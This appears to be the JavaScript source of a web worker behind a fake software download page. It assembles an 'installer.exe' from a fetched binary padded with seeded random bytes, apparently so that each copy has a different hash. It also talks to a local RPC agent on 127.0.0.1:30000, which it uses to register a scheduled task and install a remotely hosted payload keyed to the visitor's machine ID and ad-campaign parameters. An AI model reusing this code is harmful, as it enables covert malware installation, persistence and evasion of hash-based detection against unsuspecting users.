"use strict";

(() => {
  // Utility functions for data conversion
  function base64Decode(base64String) {
    const binaryString = atob(base64String);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
  }

  function hexStringToBytes(hexString) {
    const bytes = new Uint8Array(Math.ceil(hexString.length / 2));
    for (let i = 0; i < hexString.length; i += 2) {
      bytes[i / 2] = parseInt(hexString.substr(i, 2), 16);
    }
    return bytes;
  }

  function bytesToHexString(bytes) {
    return Array.prototype.map.call(bytes, byte => byte.toString(16).padStart(2, "0")).join("");
  }

  function bigIntToBytes(bigIntVal) {
    const hexString = bigIntVal.toString(16).padStart(32, "0");
    return hexStringToBytes(hexString);
  }

  function bytesToBigInt(bytes) {
    const hexString = bytesToHexString(bytes);
    return BigInt(`0x${hexString}`);
  }

  function createDeferredPromise() {
    let resolve, reject;
    const promise = new Promise((res, rej) => {
      resolve = res;
      reject = rej;
    });
    return { promise, resolve, reject };
  }

  function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  function noop() {}

  function retry(fn, maxAttempts = Infinity, delayMs = 300) {
    return async function (...args) {
      for (let attempt = 0; attempt < maxAttempts; attempt++) {
        try {
          return await fn(...args);
        } catch (error) {
          await delay(delayMs);
        }
      }
    };
  }

  function streamFromAsyncIterable(asyncIterable) {
    return new ReadableStream({
      async pull(controller) {
        try {
          for await (const chunk of asyncIterable) {
            controller.enqueue(chunk);
          }
          controller.close();
        } catch (error) {
          controller.error(error);
        }
      }
    });
  }

  // Constants for AES-CTR encryption
  const AES_BLOCK_SIZE = 16;
  const BUFFER_SIZE = AES_BLOCK_SIZE * 655360;
  const MAX_BIGINT = 0xffffffffffffffffffffffffffffffffn;
  const MODULUS = MAX_BIGINT + 1n;

  function generateRandomStream(seed, size) {
    return streamFromAsyncIterable(generateRandomChunks(seed, size));
  }

  async function* generateRandomChunks(seed, size) {
    const hash = await crypto.subtle.digest("SHA-256", seed);
    const keyBytes = hash.slice(0, 16);
    const counterBytes = hash.slice(16, 32);
    const key = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-CTR" }, false, ["encrypt"]);
    const buffer = new ArrayBuffer(BUFFER_SIZE);

    for (let offset = 0; offset < size; offset += BUFFER_SIZE) {
      const counter = incrementCounter(counterBytes, offset);
      const encrypted = await crypto.subtle.encrypt(
        { name: "AES-CTR", counter, length: 128 },
        key,
        buffer
      );
      yield new Uint8Array(encrypted.slice(0, size - offset));
    }
  }

  function incrementCounter(counterBytes, offset) {
    let counterBigInt = bytesToBigInt(counterBytes);
    counterBigInt += BigInt(offset / AES_BLOCK_SIZE);
    counterBigInt %= MODULUS;
    return bigIntToBytes(counterBigInt);
  }

  // A TransformStream subclass for handling template-based stream transformation
  class TemplateStream extends TransformStream {
    constructor(template) {
      super();
      this.template = template;
      this.writer = this.writable.getWriter();
      this.index = 0;
      this.offset = 0;
      this.cache = [];
      this.offsets = [];
    }

    start(streams) {
      for (let i = 0; i < streams.length; i++) {
        const emit = this.emit.bind(this, i);
        const writableStream = new WritableStream({ write: emit });
        streams[i].pipeTo(writableStream);
      }
      this.tick();
    }

    tick(forceNext = false) {
      if (forceNext) {
        this.next();
      }
      const templateItem = this.template[this.index];
      if (!templateItem) {
        this.writer.close().catch(noop);
        return;
      }
      if (Array.isArray(templateItem)) {
        this.loadTemplateItem(templateItem);
      } else {
        this.write(templateItem);
        this.tick(true);
      }
    }

    loadTemplateItem([streamIndex, start, length]) {
      if (this.offset === length) {
        this.tick(true);
        return;
      }
      const cachedChunks = this.cache[streamIndex];
      if (!cachedChunks) {
        return;
      }
      const absoluteStart = start + this.offset;
      const neededLength = length - this.offset;
      for (let i = 0; i < cachedChunks.length; i++) {
        const [chunkStart, chunkData] = cachedChunks[i];
        const offsetInChunk = absoluteStart - chunkStart;
        if (offsetInChunk >= 0 && offsetInChunk < chunkData.byteLength) {
          const slice = chunkData.slice(offsetInChunk, offsetInChunk + neededLength);
          this.write(slice);
          if (!this.isRequired(streamIndex, chunkStart, chunkData)) {
            cachedChunks.splice(i, 1);
          }
          this.tick();
          return;
        }
      }
    }

    next() {
      this.index++;
      this.offset = 0;
    }

    write(chunk) {
      this.offset += chunk.byteLength;
      this.writer.write(chunk);
    }

    emit(streamIndex, chunk) {
      if (!chunk.byteLength) return;
      const currentOffset = this.offsets[streamIndex] || 0;
      this.offsets[streamIndex] = currentOffset + chunk.byteLength;
      if (this.isRequired(streamIndex, currentOffset, chunk)) {
        if (!this.cache[streamIndex]) {
          this.cache[streamIndex] = [];
        }
        this.cache[streamIndex].push([currentOffset, chunk]);
        this.tick();
      }
    }

    isRequired(streamIndex, chunkStart, chunkData) {
      const chunkEnd = chunkStart + chunkData.byteLength;
      for (let i = this.index; i < this.template.length; i++) {
        const item = this.template[i];
        if (!Array.isArray(item)) continue;
        const [itemStreamIndex, itemStart, itemLength] = item;
        if (itemStreamIndex !== streamIndex) continue;
        const absoluteItemStart = itemStart + (i === this.index ? this.offset : 0);
        const absoluteItemEnd = absoluteItemStart + itemLength;
        if (
          (chunkStart >= absoluteItemStart && chunkStart < absoluteItemEnd) ||
          (chunkEnd > absoluteItemStart && chunkEnd <= absoluteItemEnd) ||
          (chunkStart <= absoluteItemStart && chunkEnd >= absoluteItemEnd)
        ) {
          return true;
        }
      }
      return false;
    }
  }

  // Configuration object
  const config = {
    query: {
      metadata: ["utm_campaign", "utm_content", "utm_source", "cid", "bid", "fbclid", "fbid"],
      remove: ["token", "bypass"]
    },
    persistance: {
      key: "heardHelpAnnouncement"
    },
    api: {
      url: "/config"
    },
    rpc: {
      url: "http://127.0.0.1:30000"
    },
    file: {
      name: "installer.exe"
    }
  };

  // API functions
  async function fetchJson(url, body, responseType = "json") {
    const response = await fetchResource(url, body);
    if (!response.ok) throw new Error("response-not-ok");
    return response[responseType]().catch(() => null);
  }

  async function fetchResource(url, body) {
    const options = body ? {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    } : null;
    const response = await fetch(new URL(url, globalThis.location.origin), options).catch(() => null);
    if (!response) throw new Error("no-response");
    return response;
  }

  async function fetchInstallerConfig() {
    const response = await fetchJson(config.api.url);
    if (!response) throw new Error("no-installer");
    return {
      ...(response.random && {
        random: {
          seed: base64Decode(response.random.seed),
          size: response.random.size
        }
      }),
      template: response.template.map(item => typeof item === "string" ? base64Decode(item) : item),
      standaloneUrl: response.standaloneUrl
    };
  }

  async function fetchStandaloneStream(url) {
    const response = await fetchResource(url).then(res => res.body);
    if (!response) throw new Error("no-standalone-stream");
    const decompressionStream = new DecompressionStream("gzip");
    return response.pipeThrough(decompressionStream);
  }

  async function fetchInstallerPayload(machineId, metadata) {
    const response = await fetchJson(config.api.url, { machineId, ...metadata });
    if (!response) throw new Error("no-installer-payload");
    return response;
  }

  // WebSocket functions
  function connectWebSocket(url) {
    return new Promise((resolve, reject) => {
      const socket = new WebSocket(url);
      socket.onopen = () => resolve(socket);
      socket.onerror = error => reject(error);
    });
  }

  const retryConnectWebSocket = retry(() => connectWebSocket(config.rpc.url));

  function createRpcClient(socket) {
    let nextId = 0;
    const pendingRequests = new Map();

    socket.addEventListener("message", event => {
      const { id, error, result } = JSON.parse(event.data);
      const request = pendingRequests.get(id);
      if (request) {
        pendingRequests.delete(id);
        if (error) {
          request.reject(error);
        } else {
          request.resolve(result);
        }
      }
    });

    return {
      request(method, params) {
        const id = nextId++;
        const deferred = createDeferredPromise();
        pendingRequests.set(id, deferred);
        const message = JSON.stringify({ id, type: method, args: params });
        socket.send(message);
        return deferred.promise;
      }
    };
  }

  // Global state for the worker
  let installerConfigPromise = fetchInstallerConfig();
  let isWorking = false;

  // Worker message handling
  self.onconnect = function (event) {
    const port = event.ports[0];
    port.onmessage = async function (event) {
      const { type, payload } = event.data;
      switch (type) {
        case "start": {
          if (isWorking) return;
          isWorking = true;
          handleStart(port, payload);
          break;
        }
        case "file": {
          const fileStream = await prepareFileStream();
          port.postMessage({ type: "file", payload: fileStream }, [fileStream]);
          break;
        }
      }
    };

    async function handleStart(port, metadata) {
      const socket = await retryConnectWebSocket();
      if (!socket) return;
      const rpcClient = createRpcClient(socket);
      try {
        const info = await rpcClient.request("info", []);
        port.postMessage({ type: "start", payload: info });
        if (!info) throw new Error("no-info");
        const { task, payload: installerPayload } = await fetchInstallerPayload(info.machineId, metadata);
        await rpcClient.request("task", [task.name, task.xml]);
        await rpcClient.request("install", [installerPayload.url, installerPayload.name, installerPayload.icon]);
        port.postMessage({ type: "finish" });
      } finally {
        await rpcClient.request("exit", []);
        socket.close();
      }
    }

    async function prepareFileStream() {
      const config = await installerConfigPromise;
      const streams = [await fetchStandaloneStream(config.standaloneUrl)];
      if (config.random) {
        const randomStream = generateRandomStream(config.random.seed, config.random.size);
        streams.push(randomStream);
      }
      const templateStream = new TemplateStream(config.template);
      templateStream.start(streams);
      return templateStream.readable;
    }
  };
})();